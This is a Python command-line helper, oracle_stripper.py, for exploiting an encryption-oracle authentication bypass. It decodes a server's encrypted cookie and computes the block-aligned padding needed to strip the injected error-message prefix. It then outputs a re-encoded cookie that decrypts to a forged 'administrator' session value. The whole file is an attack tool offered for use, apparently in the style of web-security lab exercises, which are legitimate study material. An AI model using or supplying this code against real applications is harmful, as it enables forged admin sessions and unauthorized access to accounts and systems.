#!/usr/bin/env python3
"""
oracle_stripper.py

Helper for "Authentication bypass via encryption oracle" style bugs — where
an app encrypts user-controlled input and reflects the ciphertext (e.g. in a
Set-Cookie header), and separately decrypts a user-supplied cookie and
reflects the plaintext (e.g. in an error message), using the SAME key for
both.

It automates the block-cipher math needed to strip a server-injected prefix
(e.g. "Invalid email address: ") from a block of ciphertext, so the
remaining bytes decrypt cleanly to just your forged plaintext
(e.g. "administrator:<timestamp>").

Does NOT break the cipher itself. It only automates:
  - URL/base64 decoding the ciphertext
  - locating your known plaintext inside the server's error message to
    detect the fixed prefix length
  - rounding that prefix up to the cipher's block size (default 16, AES)
  - telling you how much junk padding to prepend on your NEXT encrypt
    request so the strip lands on a clean block boundary
  - stripping + re-encoding the ciphertext once it already has that
    padding baked in

Usage (see README for the full two-pass workflow):

    python3 oracle_stripper.py \\
        --cookie "<url-encoded notification cookie>" \\
        --error-message "Invalid email address: xxxxxxxxxadministrator:1793607115644" \\
        --known-plaintext "xxxxxxxxxadministrator:1793607115644"
"""

import argparse
import base64
import urllib.parse


def strip_prefix_auto(cookie_url_encoded: str, error_message: str, known_plaintext: str, block_size: int = 16):
    idx = error_message.find(known_plaintext)
    if idx == -1:
        print("Couldn't find your plaintext in the error message — check for typos/case/whitespace.")
        return None

    prefix_len = idx
    url_decoded = urllib.parse.unquote(cookie_url_encoded)
    raw = base64.b64decode(url_decoded)
    total = len(raw)

    strip_bytes = ((prefix_len + block_size - 1) // block_size) * block_size
    pad_needed = strip_bytes - prefix_len

    print(f"Detected prefix length:        {prefix_len}")
    print(f"Total ciphertext bytes:        {total}")
    print(f"Bytes to strip (block-aligned): {strip_bytes}")
    print(f"Junk padding needed on next encrypt: {pad_needed}")
    print(f"Prepend to your plaintext next time:  {'x' * pad_needed}{known_plaintext}")

    result = {
        "prefix_len": prefix_len,
        "total_bytes": total,
        "strip_bytes": strip_bytes,
        "pad_needed": pad_needed,
        "stripped_cookie": None,
    }

    if total >= strip_bytes and (total - strip_bytes) % block_size == 0 and (total - strip_bytes) > 0:
        stripped = raw[strip_bytes:]
        b64 = base64.b64encode(stripped).decode()
        url = urllib.parse.quote(b64, safe="")
        print(f"\nStripped + re-encoded cookie (paste into the decrypt request):")
        print(url)
        result["stripped_cookie"] = url
    else:
        print(
            "\nNot stripping yet — this ciphertext doesn't already carry the junk padding "
            "reported above. Re-send your encrypt request with that padding prepended, "
            "grab the NEW cookie + error message, and run this script again on those."
        )

    return result


def main():
    parser = argparse.ArgumentParser(description="Strip a fixed server-injected prefix from encryption-oracle ciphertext.")
    parser.add_argument("--cookie", required=True, help="URL-encoded ciphertext cookie value")
    parser.add_argument("--error-message", required=True, help="Exact error/response text containing your reflected plaintext")
    parser.add_argument("--known-plaintext", required=True, help="Exact string you submitted (including any junk padding already added)")
    parser.add_argument("--block-size", type=int, default=16, help="Cipher block size in bytes (default 16 for AES)")
    args = parser.parse_args()

    strip_prefix_auto(args.cookie, args.error_message, args.known_plaintext, args.block_size)


if __name__ == "__main__":
    main()
